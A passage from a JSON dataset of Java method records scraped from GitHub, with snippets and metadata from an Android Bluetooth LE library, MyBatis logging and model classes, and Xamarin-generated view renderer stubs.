textureGetter.apply(ids.get(i));\t\t}\t\treturn sprites;\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/tile/provider/BasicTileProvider.java", "stars": "3", "class": {"name": "BasicTileProvider", "extends": null, "implements": ["TileProvider"], "modifiers": ["public"]}}, {"method_name": "withUUID", "params": ["UUID", "UUID"], "throws": null, "modifiers": ["private"], "return_type": "BleConnector", "snippet": "    private BleConnector withUUID(UUID serviceUUID, UUID characteristicUUID) {        if (serviceUUID != null && mBluetoothGatt != null) {            mGattService = mBluetoothGatt.getService(serviceUUID);        }        if (mGattService != null && characteristicUUID != null) {            mCharacteristic = mGattService.getCharacteristic(characteristicUUID);        }        return this;    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "withUUIDString", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "BleConnector", "snippet": "    public BleConnector withUUIDString(String serviceUUID, String characteristicUUID) {        return withUUID(formUUID(serviceUUID), formUUID(characteristicUUID));    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "formUUID", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "UUID", "snippet": "    private UUID formUUID(String uuid) {        return uuid == null ? null : UUID.fromString(uuid);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "enableCharacteristicNotify", "params": ["BleNotifyCallback", "String", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void enableCharacteristicNotify(BleNotifyCallback bleNotifyCallback, String uuid_notify,                                           boolean userCharacteristicDescriptor) {        if (mCharacteristic != null                && (mCharacteristic.getProperties() | BluetoothGattCharacteristic.PROPERTY_NOTIFY) > 0) {            handleCharacteristicNotifyCallback(bleNotifyCallback, uuid_notify);            setCharacteristicNotification(mBluetoothGatt, mCharacteristic, userCharacteristicDescriptor, true, bleNotifyCallback);        } else {            if (bleNotifyCallback != null)                bleNotifyCallback.onNotifyFailure(new OtherException(\"this characteristic not support notify!\"));        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "disableCharacteristicNotify", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean disableCharacteristicNotify(boolean useCharacteristicDescriptor) {        if (mCharacteristic != null                && (mCharacteristic.getProperties() | BluetoothGattCharacteristic.PROPERTY_NOTIFY) > 0) {            return setCharacteristicNotification(mBluetoothGatt, mCharacteristic,                    useCharacteristicDescriptor, false, null);        } else {            return false;        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCharacteristicNotification", "params": ["BluetoothGatt", "BluetoothGattCharacteristic", "boolean", "boolean", "BleNotifyCallback"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean setCharacteristicNotification(BluetoothGatt gatt,                                                  BluetoothGattCharacteristic characteristic,                                                  boolean useCharacteristicDescriptor,                                                  boolean enable,                                                  BleNotifyCallback bleNotifyCallback) {        if (gatt == null || characteristic == null) {            notifyMsgInit();            if (bleNotifyCallback != null)                bleNotifyCallback.onNotifyFailure(new OtherException(\"gatt or characteristic equal null\"));            return false;        }        boolean success1 = gatt.setCharacteristicNotification(characteristic, enable);        if (!success1) {            notifyMsgInit();            if (bleNotifyCallback != null)                bleNotifyCallback.onNotifyFailure(new OtherException(\"gatt setCharacteristicNotification fail\"));            return false;        }        BluetoothGattDescriptor descriptor;        if (useCharacteristicDescriptor) {            descriptor = characteristic.getDescriptor(characteristic.getUuid());        } else {            descriptor = characteristic.getDescriptor(formUUID(UUID_CLIENT_CHARACTERISTIC_CONFIG_DESCRIPTOR));        }        if (descriptor == null) {            notifyMsgInit();            if (bleNotifyCallback != null)                bleNotifyCallback.onNotifyFailure(new OtherException(\"descriptor equals null\"));            return false;        } else {            descriptor.setValue(enable ? BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE :                    BluetoothGattDescriptor.DISABLE_NOTIFICATION_VALUE);            boolean success2 = gatt.writeDescriptor(descriptor);            if (!success2) {                notifyMsgInit();                if (bleNotifyCallback != null)                    bleNotifyCallback.onNotifyFailure(new OtherException(\"gatt writeDescriptor fail\"));            }            return success2;        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "enableCharacteristicIndicate", "params": ["BleIndicateCallback", "String", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void enableCharacteristicIndicate(BleIndicateCallback bleIndicateCallback, String uuid_indicate,                                             boolean useCharacteristicDescriptor) {        if (mCharacteristic != null                && (mCharacteristic.getProperties() | BluetoothGattCharacteristic.PROPERTY_NOTIFY) > 0) {            handleCharacteristicIndicateCallback(bleIndicateCallback, uuid_indicate);            setCharacteristicIndication(mBluetoothGatt, mCharacteristic,                    useCharacteristicDescriptor, true, bleIndicateCallback);        } else {            if (bleIndicateCallback != null)                bleIndicateCallback.onIndicateFailure(new OtherException(\"this characteristic not support indicate!\"));        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "disableCharacteristicIndicate", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean disableCharacteristicIndicate(boolean userCharacteristicDescriptor) {        if (mCharacteristic != null                && (mCharacteristic.getProperties() | BluetoothGattCharacteristic.PROPERTY_NOTIFY) > 0) {            return setCharacteristicIndication(mBluetoothGatt, mCharacteristic,                    userCharacteristicDescriptor, false, null);        } else {            return false;        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCharacteristicIndication", "params": ["BluetoothGatt", "BluetoothGattCharacteristic", "boolean", "boolean", "BleIndicateCallback"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean setCharacteristicIndication(BluetoothGatt gatt,                                                BluetoothGattCharacteristic characteristic,                                                boolean useCharacteristicDescriptor,                                                boolean enable,                                                BleIndicateCallback bleIndicateCallback) {        if (gatt == null || characteristic == null) {            indicateMsgInit();            if (bleIndicateCallback != null)                bleIndicateCallback.onIndicateFailure(new OtherException(\"gatt or characteristic equal null\"));            return false;        }        boolean success1 = gatt.setCharacteristicNotification(characteristic, enable);        if (!success1) {            indicateMsgInit();            if (bleIndicateCallback != null)                bleIndicateCallback.onIndicateFailure(new OtherException(\"gatt setCharacteristicNotification fail\"));            return false;        }        BluetoothGattDescriptor descriptor;        if (useCharacteristicDescriptor) {            descriptor = characteristic.getDescriptor(characteristic.getUuid());        } else {            descriptor = characteristic.getDescriptor(formUUID(UUID_CLIENT_CHARACTERISTIC_CONFIG_DESCRIPTOR));        }        if (descriptor == null) {            indicateMsgInit();            if (bleIndicateCallback != null)                bleIndicateCallback.onIndicateFailure(new OtherException(\"descriptor equals null\"));            return false;        } else {            descriptor.setValue(enable ? BluetoothGattDescriptor.ENABLE_INDICATION_VALUE :                    BluetoothGattDescriptor.DISABLE_NOTIFICATION_VALUE);            boolean success2 = gatt.writeDescriptor(descriptor);            if (!success2) {                indicateMsgInit();                if (bleIndicateCallback != null)                    bleIndicateCallback.onIndicateFailure(new OtherException(\"gatt writeDescriptor fail\"));            }            return success2;        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "writeCharacteristic", "params": ["byte", "BleWriteCallback", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeCharacteristic(byte[] data, BleWriteCallback bleWriteCallback, String uuid_write) {        if (data == null || data.length <= 0) {            if (bleWriteCallback != null)                bleWriteCallback.onWriteFailure(new OtherException(\"the data to be written is empty\"));            return;        }        if (mCharacteristic == null                || (mCharacteristic.getProperties() & (BluetoothGattCharacteristic.PROPERTY_WRITE | BluetoothGattCharacteristic.PROPERTY_WRITE_NO_RESPONSE)) == 0) {            if (bleWriteCallback != null)                bleWriteCallback.onWriteFailure(new OtherException(\"this characteristic not support write!\"));            return;        }        if (mCharacteristic.setValue(data)) {            handleCharacteristicWriteCallback(bleWriteCallback, uuid_write);            if (!mBluetoothGatt.writeCharacteristic(mCharacteristic)) {                writeMsgInit();                if (bleWriteCallback != null)                    bleWriteCallback.onWriteFailure(new OtherException(\"gatt writeCharacteristic fail\"));            }        } else {            if (bleWriteCallback != null)                bleWriteCallback.onWriteFailure(new OtherException(\"Updates the locally stored value of this characteristic fail\"));        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "readCharacteristic", "params": ["BleReadCallback", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void readCharacteristic(BleReadCallback bleReadCallback, String uuid_read) {        if (mCharacteristic != null                && (mCharacteristic.getProperties() & BluetoothGattCharacteristic.PROPERTY_READ) > 0) {            handleCharacteristicReadCallback(bleReadCallback, uuid_read);            if (!mBluetoothGatt.readCharacteristic(mCharacteristic)) {                readMsgInit();                if (bleReadCallback != null)                    bleReadCallback.onReadFailure(new OtherException(\"gatt readCharacteristic fail\"));            }        } else {            if (bleReadCallback != null)                bleReadCallback.onReadFailure(new OtherException(\"this characteristic not support read!\"));        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "readRemoteRssi", "params": ["BleRssiCallback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void readRemoteRssi(BleRssiCallback bleRssiCallback) {        handleRSSIReadCallback(bleRssiCallback);        if (!mBluetoothGatt.readRemoteRssi()) {            rssiMsgInit();            if (bleRssiCallback != null)                bleRssiCallback.onRssiFailure(new OtherException(\"gatt readRemoteRssi fail\"));        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setMtu", "params": ["int", "BleMtuChangedCallback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMtu(int requiredMtu, BleMtuChangedCallback bleMtuChangedCallback) {        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {            handleSetMtuCallback(bleMtuChangedCallback);            if (!mBluetoothGatt.requestMtu(requiredMtu)) {                mtuChangedMsgInit();                if (bleMtuChangedCallback != null)                    bleMtuChangedCallback.onSetMTUFailure(new OtherException(\"gatt requestMtu fail\"));            }        } else {            if (bleMtuChangedCallback != null)                bleMtuChangedCallback.onSetMTUFailure(new OtherException(\"API level lower than 21\"));        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "requestConnectionPriority", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean requestConnectionPriority(int connectionPriority) {        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {            return mBluetoothGatt.requestConnectionPriority(connectionPriority);        }        return false;    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "handleCharacteristicNotifyCallback", "params": ["BleNotifyCallback", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleCharacteristicNotifyCallback(BleNotifyCallback bleNotifyCallback,                                                    String uuid_notify) {        if (bleNotifyCallback != null) {            notifyMsgInit();            bleNotifyCallback.setKey(uuid_notify);            bleNotifyCallback.setHandler(mHandler);            mBleBluetooth.addNotifyCallback(uuid_notify, bleNotifyCallback);            mHandler.sendMessageDelayed(                    mHandler.obtainMessage(BleMsg.MSG_CHA_NOTIFY_START, bleNotifyCallback),                    BleManager.getInstance().getOperateTimeout());        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "handleCharacteristicIndicateCallback", "params": ["BleIndicateCallback", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleCharacteristicIndicateCallback(BleIndicateCallback bleIndicateCallback,                                                      String uuid_indicate) {        if (bleIndicateCallback != null) {            indicateMsgInit();            bleIndicateCallback.setKey(uuid_indicate);            bleIndicateCallback.setHandler(mHandler);            mBleBluetooth.addIndicateCallback(uuid_indicate, bleIndicateCallback);            mHandler.sendMessageDelayed(                    mHandler.obtainMessage(BleMsg.MSG_CHA_INDICATE_START, bleIndicateCallback),                    BleManager.getInstance().getOperateTimeout());        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "handleCharacteristicWriteCallback", "params": ["BleWriteCallback", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleCharacteristicWriteCallback(BleWriteCallback bleWriteCallback,                                                   String uuid_write) {        if (bleWriteCallback != null) {            writeMsgInit();            bleWriteCallback.setKey(uuid_write);            bleWriteCallback.setHandler(mHandler);            mBleBluetooth.addWriteCallback(uuid_write, bleWriteCallback);            mHandler.sendMessageDelayed(                    mHandler.obtainMessage(BleMsg.MSG_CHA_WRITE_START, bleWriteCallback),                    BleManager.getInstance().getOperateTimeout());        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "handleCharacteristicReadCallback", "params": ["BleReadCallback", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleCharacteristicReadCallback(BleReadCallback bleReadCallback,                                                  String uuid_read) {        if (bleReadCallback != null) {            readMsgInit();            bleReadCallback.setKey(uuid_read);            bleReadCallback.setHandler(mHandler);            mBleBluetooth.addReadCallback(uuid_read, bleReadCallback);            mHandler.sendMessageDelayed(                    mHandler.obtainMessage(BleMsg.MSG_CHA_READ_START, bleReadCallback),                    BleManager.getInstance().getOperateTimeout());        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "handleRSSIReadCallback", "params": ["BleRssiCallback"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleRSSIReadCallback(BleRssiCallback bleRssiCallback) {        if (bleRssiCallback != null) {            rssiMsgInit();            bleRssiCallback.setHandler(mHandler);            mBleBluetooth.addRssiCallback(bleRssiCallback);            mHandler.sendMessageDelayed(                    mHandler.obtainMessage(BleMsg.MSG_READ_RSSI_START, bleRssiCallback),                    BleManager.getInstance().getOperateTimeout());        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "handleSetMtuCallback", "params": ["BleMtuChangedCallback"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleSetMtuCallback(BleMtuChangedCallback bleMtuChangedCallback) {        if (bleMtuChangedCallback != null) {            mtuChangedMsgInit();            bleMtuChangedCallback.setHandler(mHandler);            mBleBluetooth.addMtuChangedCallback(bleMtuChangedCallback);            mHandler.sendMessageDelayed(                    mHandler.obtainMessage(BleMsg.MSG_SET_MTU_START, bleMtuChangedCallback),                    BleManager.getInstance().getOperateTimeout());        }    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "notifyMsgInit", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void notifyMsgInit() {        mHandler.removeMessages(BleMsg.MSG_CHA_NOTIFY_START);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "indicateMsgInit", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void indicateMsgInit() {        mHandler.removeMessages(BleMsg.MSG_CHA_INDICATE_START);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "writeMsgInit", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeMsgInit() {        mHandler.removeMessages(BleMsg.MSG_CHA_WRITE_START);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "readMsgInit", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void readMsgInit() {        mHandler.removeMessages(BleMsg.MSG_CHA_READ_START);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "rssiMsgInit", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void rssiMsgInit() {        mHandler.removeMessages(BleMsg.MSG_READ_RSSI_START);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "mtuChangedMsgInit", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mtuChangedMsgInit() {        mHandler.removeMessages(BleMsg.MSG_SET_MTU_START);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/bluetooth/BleConnector.java", "stars": "2", "class": {"name": "BleConnector", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getId() {    return id;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/serializecircular/Department.java", "stars": "15", "class": {"name": "Department", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setId", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setId(Integer id) {    this.id = id;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/serializecircular/Department.java", "stars": "15", "class": {"name": "Department", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setAttribute", "params": ["Attribute"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setAttribute(Attribute attribute) {    this.attribute = attribute;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/serializecircular/Department.java", "stars": "15", "class": {"name": "Department", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getAttribute", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Attribute", "snippet": "  public Attribute getAttribute() {    return attribute;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/serializecircular/Department.java", "stars": "15", "class": {"name": "Department", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setPerson", "params": ["Person"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setPerson(Person person) {    this.person = person;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/serializecircular/Department.java", "stars": "15", "class": {"name": "Department", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getPerson", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Person", "snippet": "  public Person getPerson() {    return person;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/serializecircular/Department.java", "stars": "15", "class": {"name": "Department", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "invoke", "params": ["Object", "Method", "Object"], "throws": ["Throwable"], "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object invoke(Object proxy, Method method, Object[] params) throws Throwable {    try {      if (Object.class.equals(method.getDeclaringClass())) {        return method.invoke(this, params);      }      if (EXECUTE_METHODS.contains(method.getName())) {        if (isDebugEnabled()) {          debug(\"Parameters: \" + getParameterValueString(), true);        }        clearColumnInfo();        if (\"executeQuery\".equals(method.getName())) {          ResultSet rs = (ResultSet) method.invoke(statement, params);          return rs == null ? null : ResultSetLogger.newInstance(rs, statementLog, queryStack);        } else {          return method.invoke(statement, params);        }      } else if (SET_METHODS.contains(method.getName())) {        if (\"setNull\".equals(method.getName())) {          setColumn(params[0], null);        } else {          setColumn(params[0], params[1]);        }        return method.invoke(statement, params);      } else if (\"getResultSet\".equals(method.getName())) {        ResultSet rs = (ResultSet) method.invoke(statement, params);        return rs == null ? null : ResultSetLogger.newInstance(rs, statementLog, queryStack);      } else if (\"getUpdateCount\".equals(method.getName())) {        int updateCount = (Integer) method.invoke(statement, params);        if (updateCount != -1) {          debug(\"   Updates: \" + updateCount, false);        }        return updateCount;      } else {        return method.invoke(statement, params);      }    } catch (Throwable t) {      throw ExceptionUtil.unwrapThrowable(t);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/jdbc/PreparedStatementLogger.java", "stars": "15", "class": {"name": "PreparedStatementLogger", "extends": "BaseJdbcLogger", "implements": ["InvocationHandler"], "modifiers": ["public", "final"]}}, {"method_name": "newInstance", "params": ["PreparedStatement", "Log", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "PreparedStatement", "snippet": "  public static PreparedStatement newInstance(PreparedStatement stmt, Log statementLog, int queryStack) {    InvocationHandler handler = new PreparedStatementLogger(stmt, statementLog, queryStack);    ClassLoader cl = PreparedStatement.class.getClassLoader();    return (PreparedStatement) Proxy.newProxyInstance(cl, new Class[]{PreparedStatement.class, CallableStatement.class}, handler);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/jdbc/PreparedStatementLogger.java", "stars": "15", "class": {"name": "PreparedStatementLogger", "extends": "BaseJdbcLogger", "implements": ["InvocationHandler"], "modifiers": ["public", "final"]}}, {"method_name": "getPreparedStatement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "PreparedStatement", "snippet": "  public PreparedStatement getPreparedStatement() {    return statement;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/jdbc/PreparedStatementLogger.java", "stars": "15", "class": {"name": "PreparedStatementLogger", "extends": "BaseJdbcLogger", "implements": ["InvocationHandler"], "modifiers": ["public", "final"]}}, {"method_name": "draw", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void draw (android.graphics.Canvas p0)\t{\t\tn_draw (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollViewRenderer.java", "stars": "2", "class": {"name": "ScrollViewRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_draw", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_draw (android.graphics.Canvas p0);\tpublic boolean onInterceptTouchEvent (android.view.MotionEvent p0)\t{\t\treturn n_onInterceptTouchEvent (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollViewRenderer.java", "stars": "2", "class": {"name": "ScrollViewRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "onInterceptTouchEvent", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onInterceptTouchEvent (android.view.MotionEvent p0)\t{\t\treturn n_onInterceptTouchEvent (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollViewRenderer.java", "stars": "2", "class": {"name": "ScrollViewRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_onInterceptTouchEvent", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onInterceptTouchEvent (android.view.MotionEvent p0);\tpublic boolean onTouchEvent (android.view.MotionEvent p0)\t{\t\treturn n_onTouchEvent (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollViewRenderer.java", "stars": "2", "class": {"name": "ScrollViewRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "onTouchEvent", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onTouchEvent (android.view.MotionEvent p0)\t{\t\treturn n_onTouchEvent (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollViewRenderer.java", "stars": "2", "class": {"name": "ScrollViewRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_onTouchEvent", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onTouchEvent (android.view.MotionEvent p0);\tpublic void onAttachedToWindow ()\t{\t\tn_onAttachedToWindow ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollViewRenderer.java", "stars": "2", "class": {"name": "ScrollViewRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "onAttachedToWindow", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onAttachedToWindow ()\t{\t\tn_onAttachedToWindow ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollViewRenderer.java", "stars": "2", "class": {"name": "ScrollViewRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_onAttachedToWindow", "params": [], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onAttachedToWindow ();\tpublic void onDetachedFromWindow ()\t{\t\tn_onDetachedFromWindow ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ScrollViewRenderer.java", "stars": "2", "class": {"name": 